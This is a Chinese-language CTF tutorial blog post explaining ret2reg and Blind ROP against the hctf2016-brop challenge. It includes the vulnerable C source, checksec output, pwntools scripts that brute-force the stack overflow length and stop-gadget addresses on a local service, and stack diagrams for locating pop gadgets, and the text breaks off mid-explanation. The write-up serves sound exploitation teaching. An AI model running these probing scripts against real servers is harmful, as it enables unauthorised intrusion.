<!DOCTYPE html>
<html lang="zh-Hans">
<head>
    <meta charset="UTF-8">
<meta name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

    <meta name="author" content="hollk">


    <meta name="subtitle" content="ret2text">


    <meta name="description" content="说人话，讲清楚，负责到底">


    <meta name="keywords" content="ret2text,二进制,pwn,ctf-wiki">


<title>好好说话之ret2reg | Hollk&#39;s Blog</title>



    <link rel="icon" href="/favicon.ico">




    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/js/script.js"></script>
    
    <script src="/js/tocbot.min.js"></script>
    



    
    
        
    


<meta name="generator" content="Hexo 4.2.0"></head>
<body>
    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/">Hollk&#39;s Blog</a></div>
            <div class="menu navbar-right">
                
                    <a class="menu-item" href="/archives">主页</a>
                
                    <a class="menu-item" href="/category">分类</a>
                
                    <a class="menu-item" href="/tag">标签</a>
                
                    <a class="menu-item" href="/about">关于我</a>
                
                <input id="switch_default" type="checkbox" class="switch_default">
                <label for="switch_default" class="toggleBtn"></label>
            </div>
        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div>
                    <a href="/">Hollk&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
                </div>
                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
            </div>
            <div class="menu" id="mobile-menu">
                
                    <a class="menu-item" href="/archives">主页</a>
                
                    <a class="menu-item" href="/category">分类</a>
                
                    <a class="menu-item" href="/tag">标签</a>
                
                    <a class="menu-item" href="/about">关于我</a>
                
            </div>
        </div>
    </nav>

</header>
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if(toggleMenu.classList.contains("active")){
           toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        }else{
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>
        <div class="main">
            <div class="container">
    
    
        <div class="post-toc">
    <div class="tocbot-list">
    </div>
    <div class="tocbot-list-menu">
        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
        <a onclick="go_top()">Back to top</a>
        <a onclick="go_bottom()">Go to bottom</a>
    </div>
</div>

<script>
    document.ready(
        function () {
            tocbot.init({
                tocSelector: '.tocbot-list',
                contentSelector: '.post-content',
                headingSelector: 'h1, h2, h3, h4, h5',
                collapseDepth: 1,
                orderedList: false,
                scrollSmooth: true,
            })
        }
    )

    function expand_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 6,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "collapse_toc()");
        b.innerHTML = "Collapse all"
    }

    function collapse_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 1,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "expand_toc()");
        b.innerHTML = "Expand all"
    }

    function go_top() {
        window.scrollTo(0, 0);
    }

    function go_bottom() {
        window.scrollTo(0, document.body.scrollHeight);
    }

</script>
    

    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">好好说话之ret2reg</h1>
            
                <div class="post-meta">
                    
                        Author: <a itemprop="author" rel="author" href="/">hollk</a>
                    

                    
                        <span class="post-time">
                        Date: <a href="#">April 29, 2020&nbsp;&nbsp;16:00:23</a>
                        </span>
                    
                    
                        <span class="post-category">
                    Category:
                            
                                <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6-%E6%A0%88%E6%BA%A2%E5%87%BA/">二进制--栈溢出</a>
                            
                        </span>
                    
                </div>
            
        </header>

        <div class="post-content">
            <p>##一、原理：</p>
<ul>
<li>查看溢出函数返回时哪个寄存器指向溢出缓冲区</li>
<li>查找call reg或者jmp reg指令，将EIP设置为指令地址</li>
<li>reg所指向的空间上植入shellcode（确保该空间是可以执行的）</li>
</ul>
<h2 id="二、BROP"><a href="#二、BROP" class="headerlink" title="二、BROP"></a>二、BROP</h2><p>BROP（Blind ROP）瞎几把ROP，用在看不到程序C代码和二进制文件的情况下，对程序进行攻击，劫持程序的执行流。就有点像SQL注入当中的盲注，不会直接看到关键的信息，需要一个一个的去试，做题的时候就会有一种<strong><em>多元一次</em></strong>方程的感觉</p>
<h3 id="1、攻击条件"><a href="#1、攻击条件" class="headerlink" title="1、攻击条件"></a>1、攻击条件</h3><ul>
<li>程序必须存在栈溢出</li>
<li>服务器端的进程会在崩溃之后重新启动，并且重新启动的进程的地址与先前的地址一样，也就是说即使程序有ASLR保护，但是保护仅仅只对程序最初启动的时候有效。现在nginx、MySQL、Apache、OpenSSH等服务器都符合这种特性</li>
</ul>
<p>###2、攻击原理</p>
<p>在BROP情况下挖掘的基本思路：</p>
<ul>
<li>判断栈溢出的长度：暴力枚举</li>
<li>Stack Reading：获取栈上的数据来泄露canary以及ebp和返回地址</li>
<li>Blind ROP：找到足够多的gadget来控制输出函数的参数，并且对其进行调用，比如write函数或者puts函数</li>
<li>写EXP：利用输出函数来dump出程序以便于找到更多的gadget，然后写gadget</li>
</ul>
<h2 id="三、ret2reg"><a href="#三、ret2reg" class="headerlink" title="三、ret2reg"></a>三、ret2reg</h2><p>题目目录：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/ctf-challenges/pwn/stackoverflow/brop/hctf2016-brop</span><br></pre></td></tr></table></figure>

<p>C代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">	setbuf(<span class="built_in">stdin</span>,<span class="literal">NULL</span>);</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>,<span class="literal">NULL</span>);</span><br><span class="line">	setbuf(<span class="built_in">stderr</span>,<span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"WelCome my friend,Do you know password?"</span>);</span><br><span class="line">	<span class="keyword">if</span>(!check())&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Do not dump my memory"</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"No password, no game"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">50</span>];</span><br><span class="line">    <span class="built_in">read</span>(STDIN_FILENO,buf,<span class="number">1024</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">strcmp</span>(buf,<span class="string">"aslvkm;asd;alsfm;aoeim;wnv;lasdnvdljasd;flk"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在前面讲过要实现BROP，程序必须有栈溢出，并且BROP是在看不到C代码和二进制文件的情况下使用的，但是为了更好的展现这道题，还是使用IDA查看一下溢出点，方便讲解</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [sp+0h] [bp-40h]@1</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">0x400</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strcmp</span>(&amp;buf, <span class="string">"aslvkm;asd;alsfm;aoeim;wnv;lasdnvdljasd;flk"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到程序使用了read函数进行读字符串操作，所以是满足第一点攻击条件的（仅用于讲解，实际看不到二进制文件），接下来查看一下程序的保护机制：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> checksec brop</span></span><br><span class="line">[*] '/home/hollk/ctf-challenges/pwn/stackoverflow/brop/hctf2016-brop/brop'</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<p>可以看到64位程序，NX栈不可执行保护开启了，所以无法在栈中部署shellcode，因此可以考虑使用gadget。但是由于看不到程序本身的二进制代码，所以只能使用暴力穷举的方式不断的穷举地址，并根据不同的返回结果做出判断，改地址是不是我们想要的gadget。而且可以看到PIE没有开启，并且提示程序初始地址为0x400000</p>
<p>做题思路：控制puts函数打印出自身的got表地址，通过got地址利用LibcSearcher计算出当前使用的libc版本，接着找到system函数和/bin/sh地址部署到栈中执行</p>
<p>###1、判断栈溢出的长度</p>
<p>首先第一步，需要对栈空间进行判断，确定栈溢出的长度。</p>
<p>判断栈溢出可以通过循环不断的增加输入字符的长度，直至程序崩溃</p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hollk<span class="variable">@ubuntu</span><span class="symbol">:~/ctf-challenges/pwn/stackoverflow/brop/hctf2016-brop</span><span class="variable">$ </span>./brop</span><br><span class="line">WelCome my friend,Do you know password?</span><br><span class="line">a</span><br><span class="line">No password, no game</span><br></pre></td></tr></table></figure>

<p>可以看到我们出现’WelCome my friend,Do you know password?’这个字样之后等待输入，当输入一个a的时候，接下来会提示’No password, no game’的字样</p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hollk<span class="variable">@ubuntu</span><span class="symbol">:~/ctf-challenges/pwn/stackoverflow/brop/hctf2016-brop</span><span class="variable">$ </span>./brop</span><br><span class="line">WelCome my friend,Do you know password?</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab</span><br><span class="line">Segmentation fault (core dumped)</span><br></pre></td></tr></table></figure>

<p>同时在我们输入一串特别长的字符串的时候没有出现’No password, no game’的字样，那么我们就可以使用循环来不断增加字符串长度，并且根据回显结果中是否有’No password, no game’字样来判断到什么长度覆盖了ret返回地址，并且该长度减一就是栈溢出的长度</p>
<p>循环内容：累加输入字符串长度，填满栈空间<br>循环终止条件：回显结果起始位置字符串为No password, no game<br>执行目的：确定栈溢出长度，为后续所有步骤做准备</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getbufferflow_length</span><span class="params">()</span>:</span></span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            sh = remote(<span class="string">'127.0.0.1'</span>, <span class="number">9999</span>) <span class="comment">#远程链接程序，也可以使用下面的本地链接程序</span></span><br><span class="line">            <span class="comment">#sh = process('./brop')</span></span><br><span class="line">            sh.recvuntil(<span class="string">'WelCome my friend,Do you know password?\n'</span>)</span><br><span class="line">            sh.send(i * <span class="string">'a'</span>)       <span class="comment">#不断增加a的数量输入到程序中</span></span><br><span class="line">            output = sh.recv()		 <span class="comment">#将获取到的回显内容放在output变量中</span></span><br><span class="line">            sh.close()</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> output.startswith(<span class="string">'No password'</span>): </span><br><span class="line">              	<span class="comment">#判断output变量中起始位置是不是No password，如果不是说明已经溢出了</span></span><br><span class="line">                <span class="keyword">return</span> i - <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span> EOFError:<span class="comment">#主要探测是否具有canary</span></span><br><span class="line">            sh.close()</span><br><span class="line">            <span class="keyword">return</span> i - <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>根据上面的代码可以确定栈溢出的长度为72，并且根据返回信息发现没有开启canary保护</p>
<p>栈中情况：</p>
<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">             +---------------------------+</span><br><span class="line">             |<span class="string">           ret             </span>|<span class="string"> </span></span><br><span class="line"><span class="string">             +---------------------------+</span></span><br><span class="line"><span class="string">             </span>|<span class="string">            a              </span>|<span class="string"> 递增a字符串覆盖原saved ebp位置</span></span><br><span class="line"><span class="string">      ebp---&gt;+---------------------------+</span></span><br><span class="line"><span class="string">             </span>|<span class="string">            a+             </span>|<span class="string"> 递增a字符串占位填满栈空间</span></span><br><span class="line"><span class="string">             </span>|<span class="string">           ....            </span>|<span class="string">        .....</span></span><br><span class="line"><span class="string">             </span>|<span class="string">            a+             </span>|<span class="string"> 递增a字符串占位填满栈空间</span></span><br><span class="line"><span class="string">             </span>|<span class="string">            a+             </span>|<span class="string"> 递增a字符串占位填满栈空间</span></span><br><span class="line"><span class="string">             </span>|<span class="string">            a+             </span>|<span class="string"> 递增a字符串占位填满栈空间</span></span><br><span class="line"><span class="string">             </span>|<span class="string">            a+             </span>|<span class="string"> 递增a字符串占位填满栈空间</span></span><br><span class="line"><span class="string">ebp-？--&gt;+---------------------------+</span></span><br></pre></td></tr></table></figure>

<h3 id="2、寻找stop-gadget"><a href="#2、寻找stop-gadget" class="headerlink" title="2、寻找stop gadget"></a>2、寻找stop gadget</h3><p>当我们想办法寻找gadget的时候，并不知道程序具体是什么样的，所以需要控制返回地址进而去猜测gadget。那当我们控制返回地址时，一般会出现三种情况</p>
<ul>
<li>程序直接崩溃：ret地址指向的是一个程序内不存在的地址</li>
<li>程序运行一段时间后崩溃：比如运行自己构造的函数，该函数的返回地址指向不存在的地址</li>
<li>程序一直运行而不崩溃</li>
</ul>
<p>stop gadget一般指的是，但程序执行这段代码时，程序进入无限循环，这样使得攻击者能够一直保持连接状态，并且程序一直运行而不崩溃。就像蛇吃自己的尾巴一样，stop gadget最后的ret结尾地址就是程序开启的地址（比如main函数地址）</p>
<p>由于看不到二进制程序所以依然还需要使用穷举的方式不断的尝试每一个地址，所以我们从初始的地址0x400000开始，通过循环，不断累加地址进行尝试（前面检测程序保护讲了为什么初始地址是0x400000）。有了循环之后就需要考虑循环终止条件，终止条件可以参考stop gadget的特性，在执行stop gadget的时候程序会回到初始状态并且没有发生崩溃。那么我们可以利用这一特性，使用前面找到的72字节填满栈空间，之后接上穷举的地址，此时穷举地址覆盖了ret地址，那么接下来就会执行穷举地址，如果此时程序发生崩溃就进行下一次循环，如果没有崩溃则打印该地址</p>
<p>循环内容：递增地址，尝试可能的stop gadget<br>循环终止条件：程序不发生崩溃<br>执行目的：确定stop gadget为后面查找brop gadget、puts plt、puts got做准备</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_stop_addr</span><span class="params">(length)</span>:</span></span><br><span class="line">    addr = <span class="number">0x400000</span>     <span class="comment">#尝试起始地址</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            sh = remote(<span class="string">'127.0.0.1'</span>, <span class="number">9999</span>)</span><br><span class="line">            <span class="comment">#sh = process('./brop')</span></span><br><span class="line">            sh.recvuntil(<span class="string">'password?\n'</span>)</span><br><span class="line">            payload = <span class="string">'hollkdig'</span> * length + p64(addr)  <span class="comment">#输入72个字节后面加穷举地址覆盖ret</span></span><br><span class="line">            sh.sendline(payload)</span><br><span class="line">            sh.recv()    </span><br><span class="line">            sh.close()</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'one success addr: 0x%x'</span> % (addr)</span><br><span class="line">            <span class="keyword">return</span> addr  <span class="comment">#由于执行代码写在了try中，所以只有程序不崩溃才能走到这一步</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            addr += <span class="number">1</span>   <span class="comment">#如果出现崩溃导致的异常，那么addr+1</span></span><br><span class="line">            sh.close()</span><br><span class="line">            </span><br><span class="line">get_stop_addr(<span class="number">9</span>)  <span class="comment">#传入72个字符串</span></span><br></pre></td></tr></table></figure>

<p>运行之后导致不崩溃的地址会有很多，不是只有一个，当你查找到第一个不崩溃的地址的时候，可以将初始的0x400000替换成不崩溃的地址，找下一个。这里选用貌似返回到源程序中的地址0x4006b6，为了讲解方便，我们可以使用IDA查看一下该地址是什么</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004006B6</span><br><span class="line">.text:00000000004006B6 ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:00000000004006B6                 public main</span><br><span class="line">.text:00000000004006B6 main            proc near               ; DATA XREF: _start+1Do</span><br><span class="line">.text:00000000004006B6                 push    rbp</span><br><span class="line">.text:00000000004006B7                 mov     rbp, rsp</span><br><span class="line">.text:00000000004006BA                 mov     rax, cs:stdin@@GLIBC_2_2_5</span><br><span class="line">.text:00000000004006C1                 mov     esi, 0          ; buf</span><br><span class="line">.text:00000000004006C6                 mov     rdi, rax        ; stream</span><br></pre></td></tr></table></figure>

<p>该地址是main函数，当然在正常情况下是看不到的</p>
<p>栈中情况：</p>
<figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">             +---------------------------+</span><br><span class="line">             |        <span class="type">0x400000</span>+          | <span class="type">递增地址覆盖原ret</span>返回位置</span><br><span class="line">             +---------------------------+</span><br><span class="line">             |         <span class="type">hollkdig</span>          | <span class="type">hollkdig</span>字符串覆盖原saved ebp位置</span><br><span class="line">      ebp---&gt;+---------------------------+</span><br><span class="line">             |         <span class="type">hollkdig</span>          | <span class="type">hollkdig</span>字符串占位填满栈空间</span><br><span class="line">             |           <span class="type">....            |        .....</span></span><br><span class="line"><span class="type">             |         hollkdig</span>          | <span class="type">hollkdig</span>字符串占位填满栈空间</span><br><span class="line">             |         <span class="type">hollkdig</span>          | <span class="type">hollkdig</span>字符串占位填满栈空间</span><br><span class="line">             |         <span class="type">hollkdig</span>          | <span class="type">hollkdig</span>字符串占位填满栈空间</span><br><span class="line">             |         <span class="type">hollkdig</span>          | <span class="type">hollkdig</span>字符串占位填满栈空间</span><br><span class="line">ebp-？--&gt;+---------------------------+</span><br></pre></td></tr></table></figure>

<h3 id="3、寻找brop-gadget"><a href="#3、寻找brop-gadget" class="headerlink" title="3、寻找brop gadget"></a>3、寻找brop gadget</h3><p>在前面找到了stop gadget我们怎么去利用他呢，这时候就需要找到能够控制寄存器的gadget。由于我们的计划是利用puts函数打印出自己的got地址，通过got地址找到对应的libc版本，然后找到system函数和/bin/sh地址部署到栈中执行。那么需要考虑的一点是在调用puts函数之前需要将打印的内容压进rdi寄存器中，那么我们首先就需要通过gadget来控制rdi寄存器。</p>
<p>其实在libc_csu_init的结尾一长串pop的gadget中，通过偏移可以得到pop rdi的操作</p>
<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="code">+---------------------------+</span>  0x00</span><br><span class="line">|         pop rbx           |</span><br><span class="line"><span class="code">+---------------------------+</span></span><br><span class="line">|         pop rbp           |</span><br><span class="line"><span class="code">+---------------------------+</span></span><br><span class="line">|         pop r12           |</span><br><span class="line"><span class="code">+---------------------------+</span></span><br><span class="line">|         pop r13           |</span><br><span class="line"><span class="code">+---------------------------+</span></span><br><span class="line">|         pop r14           |				pop rsi  0x7</span><br><span class="line"><span class="code">+---------------------------+</span>------&gt;pop r15</span><br><span class="line">|         pop r15           |				  ret</span><br><span class="line"><span class="code">+---------------------------+</span>-------------------&gt;pop rdi 0x9</span><br><span class="line">|           ret             |											 ret</span><br><span class="line">-----------------------------</span><br></pre></td></tr></table></figure>

<p>可以看到如果以pop rbx为基地址的话向下偏移0x7会得到pop rsi的操作，向下偏移0x9会得到pop rdi的操作。这两个操作就可以帮助我们控制puts函数的输出内容</p>
<p>那么往回想既然我们需要用到pop rdi、rsi的操作就需要知道libc_csu_init结尾6个pop操作的位置。这个时候我们的stop gadget就派上用场了，为了更好地演示stop gadget的使用，这里定义栈上的三种地址</p>
<ul>
<li>Probe<ul>
<li>探针，也就是我们想要循环递增的代码地址。一般来说都是64位程序，可以直接从0x400000尝试</li>
</ul>
</li>
<li>Stop<ul>
<li>不会使得程序崩溃的stop gadget的地址</li>
</ul>
</li>
<li>Trap<ul>
<li>可以导致程序崩溃的地址</li>
</ul>
</li>
</ul>
<p>我们可以通过在栈上拜访不同程序的Stop与Trap从而来识别出正在执行的指令，举几个例子</p>
<ul>
<li>probe, stop, traps, (traps, traps, ……..)以这样的方式进行排列，可以看一下在栈中的排列</li>
</ul>
<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="code">+---------------------------+</span> </span><br><span class="line">|          traps            | &lt;----- traps，程序中不存在的地址，当IP指针指向该处时崩溃</span><br><span class="line"><span class="code">+---------------------------+</span></span><br><span class="line">|           ....            | &lt;----- traps，程序中不存在的地址，当IP指针指向该处时崩溃</span><br><span class="line"><span class="code">+---------------------------+</span></span><br><span class="line">|          traps            | &lt;----- traps，程序中不存在的地址，当IP指针指向该处时崩溃</span><br><span class="line"><span class="code">+---------------------------+</span></span><br><span class="line">|          traps            | &lt;----- traps，程序中不存在的地址，当IP指针指向该处时崩溃</span><br><span class="line"><span class="code">+---------------------------+</span></span><br><span class="line">|          traps            |	&lt;----- traps，程序中不存在的地址，当IP指针指向该处时崩溃</span><br><span class="line"><span class="code">+---------------------------+</span></span><br><span class="line">|          stop             |	&lt;----- stop gadget，不会使程序崩溃，作为probe的ret位</span><br><span class="line"><span class="code">+---------------------------+</span></span><br><span class="line">|          probe            |	&lt;----- 探针</span><br><span class="line">-----------------------------</span><br></pre></td></tr></table></figure>

<p>我们可以通过程序是否崩溃来判断probe探针中可能存在的汇编语句，在这样布局的情况下，如果程序没有崩溃，说明stop gadget被执行了。<strong>说明了probe探针中没有pop操作，并且有ret返回</strong>，如果有pop操作的话stop会被pop进寄存器当中，那么probe探针的ret返回就会指向stop的后几位traps，那么就会导致程序崩溃。那么由于在栈布局中stop gadget在probe探针的下一位，说明stop所在位置就是probe探针的ret返回地址位置。如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ret</span><br><span class="line">xor eax,eax; ret</span><br></pre></td></tr></table></figure>

<ul>
<li>probe, traps, stop, raps以这样的方式进行排列，可以看一下在栈中的排列</li>
</ul>
<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="code">+---------------------------+</span> </span><br><span class="line">|          traps            | &lt;----- traps，程序中不存在的地址，当IP指针指向该处时崩溃</span><br><span class="line"><span class="code">+---------------------------+</span></span><br><span class="line">|           ....            | &lt;----- traps，程序中不存在的地址，当IP指针指向该处时崩溃</span><br><span class="line"><span class="code">+---------------------------+</span></span><br><span class="line">|          traps            | &lt;----- traps，程序中不存在的地址，当IP指针指向该处时崩溃</span><br><span class="line"><span class="code">+---------------------------+</span></span><br><span class="line">|          traps            | &lt;----- traps，程序中不存在的地址，当IP指针指向该处时崩溃</span><br><span class="line"><span class="code">+---------------------------+</span></span><br><span class="line">|           stop            | &lt;----- stop gadget，不会使程序崩溃，作为probe的ret位</span><br><span class="line"><span class="code">+---------------------------+</span></span><br><span class="line">|          trap             | &lt;----- trap，程序中不存在的地址，当IP指针指向该处时崩溃</span><br><span class="line"><span class="code">+---------------------------+</span></span><br><span class="line">|          probe            | &lt;----- 探针</span><br><span class="line">-----------------------------</span><br></pre></td></tr></table></figure>

<p>我们可以通过程序是否崩溃来判断probe探针中可能存在的汇编语句，在这样布局的情况下，如果程序没有崩溃，说明stop gadget被执行了。<strong>说明probe指针中仅存在一个pop操作，并且有ret返回</strong>，在probe探针中只有一个pop操作的时候才会只将probe后面的trap弹进寄存器，如果有两个及两个以上的pop操作的时候，stop gadget也会被弹进寄存器中无法执行。并且在probe探针中ret返回所指的位置是stop才能使程序不崩溃，如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pop rax; ret</span><br><span class="line">pop rdi; ret</span><br></pre></td></tr></table></figure>

<ul>
<li>probe, trap, trap, trap, trap, trap, trap, stop, traps以这样的方式进行排列，可以看一下在栈中的排列</li>
</ul>
